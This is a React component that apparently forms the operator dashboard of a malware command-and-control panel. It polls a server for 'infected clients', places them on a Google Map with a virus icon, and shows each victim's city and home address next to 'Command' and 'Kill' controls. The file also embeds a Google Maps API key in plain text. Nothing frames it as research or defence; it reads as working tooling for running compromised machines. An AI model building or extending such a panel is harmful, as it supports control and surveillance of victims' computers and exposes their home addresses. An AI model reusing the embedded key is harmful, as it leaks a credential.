import React, {useEffect, useState} from "react";
import {GoogleMap, InfoWindow, Marker, withGoogleMap, withScriptjs} from "react-google-maps";
import virus from '../../../src/media/virus.svg'
import axios from "../../axios";
import {NavLink} from "react-router-dom";
import {killClient} from "../../api/api";
import styled from "@emotion/styled";

function GlobalMap() {

    const [displayClient, setDisplayClient] = useState(false); // if to display popup for client
    const [currentClient, setCurrentClient] = useState(null); //current client that has been clicked
    const [allClients, setAllClients] = useState(null)

    function getLocations() {
        axios({
            url: `/api/clients/locations`,
            headers: {
                'x-access-token': localStorage.getItem('token')
            }
        })
            .then(clients => {
                setAllClients(clients.data)
            })
            .catch(e => e)
    }

    useEffect(() => {
        getLocations();
        let handle = setInterval(getLocations, 3000)
        return () => {
            setDisplayClient(false)
            setCurrentClient(null)
            setAllClients(null)
            clearInterval(handle);
        };
    }, []);

    function displayClientInfo() {
        let currentLat = currentClient?.location.lat;
        let currentLng = currentClient?.location.lng;

        function killCurrentClient(clientId) {
            killClient(clientId).then()
            setDisplayClient(false)
        }

        return (
            <>
                {(currentLng && currentLat) &&
                <InfoWindow
                    onCloseClick={() => {
                        setDisplayClient(false);
                    }}
                    position={{
                        lat: currentLat,
                        lng: currentLng
                    }}
                >
                    <div>
                        <h5>Infected client:</h5>
                        <ul>
                            <li>ID:{currentClient.client_id}</li>
                            {currentClient.isConnected ?
                                (<li><p style={{"color": "green"}}>Status: Connected</p></li>) :
                                (<li><p style={{"color": "red"}}>Status: Disconnected</p></li>)
                            }
                            <li>Country: {currentClient.location.country}</li>
                            <li>City: {currentClient.location.city}</li>
                            <li>Home address: {currentClient.location.home_address}</li>
                        </ul>
                        <CommandRedirect>
                            <NavLink to={`/control/${currentClient.client_id}`}
                                     style={{textDecoration: 'none', color: 'white'}}>
                                Command
                            </NavLink>
                        </CommandRedirect>
                        <KillButton onClick={() => killCurrentClient(currentClient.client_id)}>Kill</KillButton>
                    </div>
                </InfoWindow>
                }
            </>
        )
    }


    function createClientIcon(client) {
        return (
            <Marker
                key={client.clientId}
                position={{
                    lat: client.location.lat,
                    lng: client.location.lng
                }}
                onClick={() => {
                    setDisplayClient(true);
                    setCurrentClient(client);
                }}
                icon={{
                    url: virus,
                    anchor: new window.google.maps.Point(17, 46),
                    scaledSize: new window.google.maps.Size(37, 37)
                }}
            />
        )
    }

    return (
        <>
            <GoogleMap defaultZoom={8} defaultCenter={{lat: 31.066830, lng: 34.897993}}>
                {allClients && allClients.map(client => createClientIcon(client))}
                {displayClient && (displayClientInfo())}
            </GoogleMap>
        </>
    )

}

const WrappedMap = withScriptjs(withGoogleMap(GlobalMap));

function GoogleMapFull() {
    let fullUrl = `https://maps.googleapis.com/maps/api/js?&libraries=geometry,drawing,places&key=AIzaSyCdThihts7X0VeVH_GKHGbGp1Nv2LjsFFE`
    return <div className={"map"}>

        <WrappedMap
            googleMapURL={fullUrl}
            loadingElement={<div style={{height: "100%"}}/>}
            containerElement={<div style={{height: "100%"}}/>}
            mapElement={<div style={{height: "100%"}}/>}
        />
    </div>;
}

export default GoogleMapFull;

const KillButton = styled.button`
  min-width: 5em;
  padding: 0.125em 0.125em;
  margin-left: 1em;
  background-color: #D11A2A;
  border-radius: 5px;
  border: none;
  color: #fafafa;
  font-weight: bold;
  text-decoration: none;

  &:hover {
    filter: brightness(1);
    background-color: red;
    border-color: #98d14a;
  }
`

const CommandRedirect = styled.button`
  min-width: 5em;
  max-width: 10em;
  padding: 0.125em 0.125em;
  margin-left: 1em;
  background-color: #007bff;
  border-radius: 5px;
  border: none;
  text-decoration: none;
  font-weight: bold;

  &:hover {
    filter: brightness(0.9);
    background-color: #007bff;
  }
`
